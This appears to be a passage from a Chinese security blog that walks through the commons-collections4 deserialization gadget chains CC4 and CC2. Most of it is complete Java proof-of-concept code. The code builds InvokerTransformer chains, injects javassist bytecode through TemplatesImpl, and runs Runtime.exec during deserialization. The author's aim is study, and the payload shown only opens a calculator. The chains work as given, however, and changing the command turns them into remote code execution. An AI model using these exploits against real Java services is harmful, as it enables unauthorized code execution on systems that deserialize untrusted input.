所以这里又将这个comparator反序列化了出来。\n那么这样过后就可以解决transient问题。\n第二个 2.也就是for循环不能进去的问题： 想要进入for循环，这里与entrySize()有关，而entrySize的值又与in.readInt()有关。\n此时同样需要看TreeBag的writeObject()方法，前面还没有分析完：\n这里在序列化的时候同样要进入父类一次，AbstractMapBag的doWriteObject()方法如下： 一眼出来，就是和这里的writeInt()有关，而writeInt()又与TreeMap的size()函数有关： 此时想到了前面cc2对这个size的描述，直接猜一波和add()相干，TreeMap有add方法，但是还是相当于直接调用的父类AbstractMapBag的add()方法： 里面会调用TreeMap的get()方法： 这里也就是看是否有值，很显然我们并没有往里面传过值，那么mut就为null，这样就进入TreeMap类的put()方法：\n再看put方法源码： 这里很自然就会使得size为1。\n——————\n但是这里需要注意会调用compare()方法，前面也说过这个方法了，如果没有设置假的话应该会导致弹两个计算机，测试一下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package org.example; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.bag.TreeBag; public class Main{ public static void main(String[] args) throws Exception { Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(chainPart); TransformingComparator comparator1 = new TransformingComparator(chain); TreeBag treeBag = new TreeBag(comparator1); treeBag.add(\u0026#34;fupanc\u0026#34;,1); } } 成功按照预期弹了两个计算机。想法成立。\n但是在前面基本流程讲解的过程中，遗留了一个问题，在反序列化时，目的同样是调用这个put()方法： 所以说会进入TreeMap类的put()方法：\n重点其实也标注出来了，主义看前面序列化之前会调用这个put()方法，在这个put()方法中将root变量赋值了，这就让root不再是一个空值，那么在反序列化时为什么可以进入呢，其实还是因为root被transient关键字修饰了，导致不能被序列化，故而在反序列化时也可以进入这个if条件，从而成功调用compare()方法。\n——————\nOK，那么就通了，只要这里size为1就可以成功使得this.map.size()返回1，这样序列化的时候就可以序列化1了，反序列化读取的时候也不是0了，从而成功可以进入for循环。\n条件基本都说明了，直接上代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 package org.example; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import java.lang.reflect.Field; import org.apache.commons.collections4.bag.TreeBag; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); TransformingComparator comparator1 = new TransformingComparator(chain); TreeBag treeBag = new TreeBag(comparator1); treeBag.add(\u0026#34;fupanc\u0026#34;,1); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(treeBag); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 成功弹出预期的两个计算机\njavassist补充 那么同样的利用javassist也是可行的，就是注意一下前面说的需要关注compare的值： 前面的理论过程懂了的话就基本没有问题了，就是下面的key需要为TemplatesImpl类实例： 这里同样需要注意add()时弹出计算机的问题，直接在下面的POC一并解决了\n可以构造如下POC：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 package org.example; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.bag.TreeBag; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception{ Constructor constructor = Class.forName(\u0026#34;org.apache.commons.collections4.functors.InvokerTransformer\u0026#34;).getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\u0026#34;newTransformer\u0026#34;); TransformingComparator comparator1 = new TransformingComparator(transformer); TreeBag treeBag = new TreeBag(comparator1); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\u0026#34;Cat\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc.exe\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \u0026#34;EvilCat\u0026#34; + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); treeBag.add(templates,1); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); outputStream.writeObject(treeBag); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); inputStream.readObject(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 弹出两个计算机，还是算预期的，add一次，反序列化一次，和CC2那里是有区别的，调试了一下好像是在第一次成功调用transform后抛出异常，导致不能调用到第二个transform。\n但是这里同样需要注意add时会调用一次，会先弹一次计算机，所以还是先假再反射更改来防止序列化前弹。\n所以最终POC为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 package org.example; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.bag.TreeBag; import java.lang.reflect.Field; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception{ ConstantTransformer fakeTransformer = new ConstantTransformer(1); Constructor constructor = Class.forName(\u0026#34;org.apache.commons.collections4.functors.InvokerTransformer\u0026#34;).getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\u0026#34;newTransformer\u0026#34;); TransformingComparator comparator1 = new TransformingComparator(fakeTransformer); TreeBag treeBag = new TreeBag(comparator1); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\u0026#34;Cat\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc.exe\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \u0026#34;EvilCat\u0026#34; + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); treeBag.add(templates,1); Field field1 = TransformingComparator.class.getDeclaredField(\u0026#34;transformer\u0026#34;); field1.setAccessible(true); field1.set(comparator1,transformer); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); outputStream.writeObject(treeBag); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); inputStream.readObject(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 成功弹出预期的一个计算机，但是不知道为啥这里能直接反射修改final修饰的transformer，正常应该是：\n1 2 3 4 5 6 7 8 import java.lang.reflect.Modifier; Field field1 = TransformingComparator.class.getDeclaredField(\u0026#34;transformer\u0026#34;); field1.setAccessible(true); Field modifiersField = Field.class.getDeclaredField(\u0026#34;modifiers\u0026#34;); modifiersField.setAccessible(true); modifiersField.setInt(field1, field1.getModifiers() \u0026amp; ~Modifier.FINAL); field1.set(comparator1,transformer); OK，链子完结了。\n","date":"2024-07-27T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/cc4/","title":"CC4"},{"content":"CC2 common-collection4 官方认为旧的旧的common-collection有一些结构和API设计上的问题，但修复这些问题会产生大量不能向前兼容的改动。于是推出的common-collection4不再认为是一个用来替换common-collection的新版本，而是一个新的包。\n两者的命名空间不冲突，可以共存在同一个项目中。\n在common-collection4-4.0下，依旧能利用common-collection-3.2.1的调用链，只是换了个包名而已。\n依赖改成如下即可：\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.commons\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections4\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 简单说点区别吧，比如\nLazyMap的decorate： 3.2.1\n4.0\n总结：一定要注意包的问题，还是有不一样的\n针对common-collections4，ysoserial也是给出了两条反序列化调用链，也就是cc2和cc4，这里就讲讲CC2。\n前置知识 测试环境： commons-collections4.0 JDK 8u411 CC2有利用到javassist，所以这里需要有javassist的前置知识。\n需要了解的类 PriorityQueue 这个类位于java.util.PriorityQueue\nPriorityQueue 优先级队列是基于优先级堆（a priority heap）的一种特殊队列，他给每个元素定义“优先级”，这样取出数据的时候会按照优先级来取。默认情况下，优先级队列会根据自然顺序对元素进行排序。\n因此，放入PriorityQueue的元素，必须实现 Comparable 接口，PriorityQueue 会更具元素的排序顺序决定出堆的优先级。如果没有实现 Comparable 接口，PriorityQueue 还允许我们提供一个 Comparator 对象来判断两个元素的顺序。\n在CC2中，我们就是要利用到PriorityQueue类，来看这个类重写的readObject()方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); s.readInt(); SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size); queue = new Object[size]; for (int i = 0; i \u0026lt; size; i++) queue[i] = s.readObject(); heapify(); } 这里将数据反序列化到queue中后，会调用heapify()方法来对数据进行排序。跟进一下heapify()方法： heapify()方法会调用siftDown()，继续跟进：\n当comparator不为 null 的时候，就会调用siftDownUsingComparator()方法：\n在 siftDownUsingComparator() 方法中，会调用 comparator 的 compare() 方法来进行优先级的比较和排序。\n这样，反序列化之后的优先级队列，也拥有了顺序。\nTransformingComparator TransformingComparator 是触发漏洞的关键，他将 Transformer 执行点和 PriorityQueue 触发点联系了起来。这个类位于org.apache.commons.collections4.comparators.TransformingComparator。\n既然这里都说到了联系了起来，在PriorityQueue 类的最后说到了 compare() 方法，那么我们来看一下TransformingComparator 的compare()方法： 这里就调用到了transform 方法，通过的是this.transformer对象，来看一下TransformingComparator的构造方法： 如果初始化的时候不指定 Comparator，则使用这个类直接定义的的 ComparableComparator.comparableComparator()，也就是第一个构造方法，并且我们就是要利用第一个构造方法。\n这里可以看到正好这个this.transformer变量是我们要求的Transformer类型。这样我们就传入基本盘的链子实现漏洞利用。\n链子大概出来了，现在就是来构造。\n攻击构造 还是给个代码来调试，结合前面的大概链子的说明，这里需要给出PriorityQueue实例和TransformingComparator实例，还是简单给出一个代码来调试。来看一下我们要利用到的PriorityQueue类的构造方法： 这里的initialCapacity不能小于1。\n结合前面的描述，我们需要将这里的this.comparator设置为TransformingComparator类的实例。\n那么就可以尝试构造一下代码了：\nfake:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package org.example; import java.util.PriorityQueue; import java.util.Comparator; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(chainPart); TransformingComparator comparator1 = new TransformingComparator(chain); PriorityQueue priority = new PriorityQueue(1,comparator1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 在调试过程中，直接在heapify()就结束了，并没有进入for循环： 个人想法：这是因为PriorityQueue被初始化的时候只有一个元素空间，但是没有实际添加任何元素，所以我们需要调用PriorityQueue的add方法来向对象添加元素\n疑问一 这里就有个小疑问了，初始化了一个元素空间，这是什么，我们看之前给出的利用到的PriorityQueue类的构造方法： 并且我们在初始化的时候确实是只传了一个1进去。现在来分析一下这个构造方法，我们看这一块： 这里是创建了一个下标为initialCapacity的Object数组并赋值给了this.queue，所以在这里initialCapacity的值代表了这个数组能容纳多少个值。\n那么现在来看一下add方法： 这个add方法实际调用的是offer()方法，来分析一下offer()方法的源码：\n这里用到了size变量，定义如下： 继续分析offer()方法：\n当第一次调用add，即第一次进入offer方法，此时会将i设置为size定义的0，然后由于i\u0026lt;我们初始化定义的queue数组长度1，所以不会进入第一个if条件\n然后继续，此时就会size赋值i+1，导致size的值变成1。\n然后由于第一次进入，此时的i为0，就会进入第二个if条件，这样就会将我们定义得queue数组的第一个值定义为我们add进的比如10。\n这样就完成了数组的赋值。\n那么如果我们类初始化时传入的是2呢？定义了“两个容量”的数组，然后在第二次put时会发生什么？（假设我们第二次还是add进10）\n这样i就是1，第一个if条件同样不会进入\nsize的值变成2\n第二个if条件不会进入，会调用siftUp方法，那么此时的i为1，x为10，看一下源码：\n类初始化的时候我们定义了comparator变量，继续跟进siftUpUsingComparator方法：\n这里自然会进入while循环，并且会调用comparator的compare()方法来比较（稍微看一下可以知道就是在给数组第二个赋值，所以基本可以肯定我们初始化时传进去的int值就是用来确定可以add进几个元素了）。\n————\n这里我想到了一个东西，由于我们传入的compare变量为TransformingComparator，那么是否可以认为只要我们正确传入链子，这里应该是可以成功弹出计算机的，测试一下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import java.util.PriorityQueue; import java.util.Comparator; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(chainPart); TransformingComparator comparator1 = new TransformingComparator(chain); PriorityQueue priority = new PriorityQueue(2,comparator1); priority.add(10); priority.add(10); } } 成功按照预期弹出两个计算机，这是因为TransformingComparator的compare用了两次transformer方法：\n那么为了避免这个序列化时弹计算机问题，我们就使用之前说过的先假再反射更改为真的就行了。\n想法结束，可行\n————\n继续分析siftUpUsingComparator代码，现在就跟进一下那个if条件，在我们进入到TransformingComparator的compare后，如上图源码。就算在上面传入真的利用链，最后返回的都是1，所以无论我们add进什么值，最后这里比较的value1和value2都是1，然后调用decorate.compare()方法，可以直接用上面的代码调试，然后到ComparableComparator类的compare()：\n然后就直接返回到TransformingComparator的compare()方法==》直接退回到add()了，不知道这个compareTo的结果是什么，但是可以加断点看结果： 可以知道最后的compareTo的结果是true，导致while循环直接结束，然后就直接给queue[1] = 10了。结合我前面说的，由于我们构造的链子，会导致compareTo比较的值会都是1，直接返回true，所以其实这里的siftUpUsingComparator()我们可以看作是直接给对应的下标k赋值为x即可。\n——————\noffer()方法分析结束，但是我此时想到了PriorityQueue的readObject()方法： 前面给过size变量的定义了，可以看出size的值是可以被序列化的，并且从上面的过程可以看出size的值是和我们add进的值个数是相同的。这样基本就可以看懂这里的readObject()方法是在干嘛了。\n疑问解决 现在继续分析heapify()方法： 就是看会不会进入这个for循环，这里的size正好就是我们前面刚说过的，前面的\u0026gt;\u0026gt;\u0026gt;是按位右移补零操作符，当size为0，1时候i都小于0，这里需要满足size≥2，即我们需要add进两个元素。\n那么代码可以改为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package org.example; import java.util.PriorityQueue; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import java.lang.reflect.Field; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); TransformingComparator comparator1 = new TransformingComparator(chain); PriorityQueue priority = new PriorityQueue(2,comparator1); priority.add(1); priority.add(1); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 但是这样已经成功在反序列化的时候弹出两个计算机了。\n还是继续跟一下：\n所以此时siftDown的参数分别为0和queue[0]的值，也就是1。\n然后有效点到了siftDownUsingComparator方法\n对应值图里面都有，size就是我们最开始定义的2，剩下的已经很好看懂了，最后就是在第二个if这里成功调用compare()方法从而弹出计算机。\nOK，调用链结束。\n最终的POC为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package org.example; import java.util.PriorityQueue; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import java.lang.reflect.Field; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); TransformingComparator comparator1 = new TransformingComparator(chain); PriorityQueue priority = new PriorityQueue(2,comparator1); priority.add(1); priority.add(1); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } javassist补充 除了前面的POC，还可以利用到javassist来操作，刚好这里要利用到之前在javassist没说过的利用方法，简单说下，直接看代码和结果就行了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package org.example; import javassist.ClassPool; import javassist.CtClass; public class Haha { public static void main(String[] args) throws Exception { ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.makeClass(\u0026#34;cat\u0026#34;); String cmd = \u0026#34;System.out.println(\\\u0026#34;static创建成功\\\u0026#34;);\u0026#34;; ctClass.makeClassInitializer().insertBefore(cmd); ctClass.writeFile(\u0026#34;output\u0026#34;); Class clazz = ctClass.toClass(); clazz.newInstance(); } } 运行后成功在output目录下生成cat.class文件： 并且成功输出static创建成功： ————————\n这里的javassist构造就直接看POC来分析\nPOC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 package org.example; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.PriorityQueue; public class Main { public static void main(String[] args) throws Exception{ Constructor constructor = Class.forName(\u0026#34;org.apache.commons.collections4.functors.InvokerTransformer\u0026#34;).getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\u0026#34;newTransformer\u0026#34;); TransformingComparator Tcomparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); //获取默认的ClassPool ClassPool pool = ClassPool.getDefault(); //向ClassPool容器插入AbstractTranslet.class pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); //创建Cat类 CtClass cc = pool.makeClass(\u0026#34;Cat\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc.exe\\\u0026#34;);\u0026#34;; //就是创建static默认方法 cc.makeClassInitializer().insertBefore(cmd); //生成一个随机的类名，这里使用了当前系统时间的纳秒部分来确保“唯一性” String randomClassName = \u0026#34;EvilCat\u0026#34; + System.nanoTime(); //更改类名，但是其实直接用Cat就行，但是用来确保唯一性也是可以的 cc.setName(randomClassName); //cc.writeFile(); //设置cc类的父类 cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); Object[] queue_array = new Object[]{templates,1}; Field queue_field = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;queue\u0026#34;); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;size\u0026#34;); size.setAccessible(true); size.set(queue,2); Field comparator_field = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;comparator\u0026#34;); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); inputStream.readObject(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 对于javassist的操作注释已经说很清楚了，从中给\u0026quot;Cat\u0026quot;类加父类AbstractTranslet就是动态加载字节码里面要求的。\n现在来分析一下其他的代码，将中间的javassist直接理解为一个构造类似Test.class的过程，现在来看其他的代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 public class Main { public static void main(String[] args) throws Exception{ Constructor constructor = Class.forName(\u0026#34;org.apache.commons.collections4.functors.InvokerTransformer\u0026#34;).getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\u0026#34;newTransformer\u0026#34;); //直接将InvokerTransformer类实例传给transformer变量 TransformingComparator Tcomparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); //将CtClass对象转换为字节码 byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; //这里是正常的能够成功加载字节码的要求 TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); Object[] queue_array = new Object[]{templates,1}; Field queue_field = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;queue\u0026#34;); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;size\u0026#34;); size.setAccessible(true); size.set(queue,2); Field comparator_field = 